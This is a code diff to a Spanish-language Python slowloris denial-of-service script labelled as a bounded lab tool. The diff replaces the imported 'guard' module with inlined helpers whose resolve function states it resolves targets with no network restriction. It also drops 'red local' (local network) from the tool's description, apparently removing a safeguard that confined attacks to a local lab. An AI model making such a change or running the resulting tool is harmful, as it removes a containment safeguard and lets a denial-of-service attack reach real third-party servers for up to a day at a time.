@@ -10,14 +10,56 @@ import json
 import socket
 import time
 
-from guard import (
-    MAX_DURATION,
-    MAX_SOCKETS,
-    GuardError,
-    clamp,
-    parse_target,
-    resolve,
-)
+# Topes duros del laboratorio (por contenedor).
+MAX_SOCKETS = 1000       # slowloris
+MAX_DURATION = 86400     # segundos (24 h) cuando no es infinito
+
+
+def parse_target(value: str, default_port: int | None = None) -> tuple[str, int]:
+    """Acepta 'host', 'host:puerto' o 'esquema://host:puerto'."""
+    raw = value.strip()
+    if "://" in raw:
+        from urllib.parse import urlparse
+
+        parsed = urlparse(raw)
+        host = parsed.hostname or ""
+        port = parsed.port or default_port
+    elif raw.count(":") == 1:
+        host, _, raw_port = raw.partition(":")
+        port = int(raw_port) if raw_port.isdigit() else default_port
+    else:
+        host, port = raw, default_port
+
+    if not host:
+        raise ValueError(f"destino invalido: '{value}'")
+    if port is None:
+        raise ValueError("falta el puerto: usa --port o 'host:puerto'")
+    if not 1 <= port <= 65535:
+        raise ValueError(f"puerto fuera de rango: {port}")
+    return host, port
+
+
+def resolve(host: str, port: int) -> str:
+    """Resuelve `host` a una dirección IP utilizable, sin restricción de red."""
+    try:
+        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
+    except socket.gaierror as exc:
+        raise ValueError(f"no se pudo resolver '{host}': {exc}") from exc
+
+    for info in infos:
+        if info[4][0]:
+            return info[4][0]
+    raise ValueError(f"'{host}' no tiene direcciones utilizables")
+
+
+def clamp(name: str, value: float, maximum: float) -> float:
+    """Recorta un parámetro al tope duro e informa cuando lo hace."""
+    if value <= 0:
+        raise ValueError(f"{name} debe ser > 0 (recibido {value})")
+    if value > maximum:
+        print(f"[limite] {name}={value} excede el tope del lab, se usa {maximum}")
+        return maximum
+    return value
 
 
 def open_partial(ip: str, port: int, host: str) -> socket.socket:
@@ -30,7 +72,7 @@ def open_partial(ip: str, port: int, host: str) -> socket.socket:
 
 def main() -> None:
     parser = argparse.ArgumentParser(
-        description="Slowloris acotado (laboratorio de red local)"
+        description="Slowloris acotado (laboratorio)"
     )
     parser.add_argument("--dns", required=True, help="nombre DNS o IP del destino")
     parser.add_argument("--port", type=int, required=True, help="puerto del destino")
@@ -42,8 +84,8 @@ def main() -> None:
 
     try:
         host, port = parse_target(args.dns, args.port)
-        ip = str(resolve(host, port))
-    except GuardError as exc:
+        ip = resolve(host, port)
+    except ValueError as exc:
         print(f"[abortado] {exc}")
         raise SystemExit(2)
 
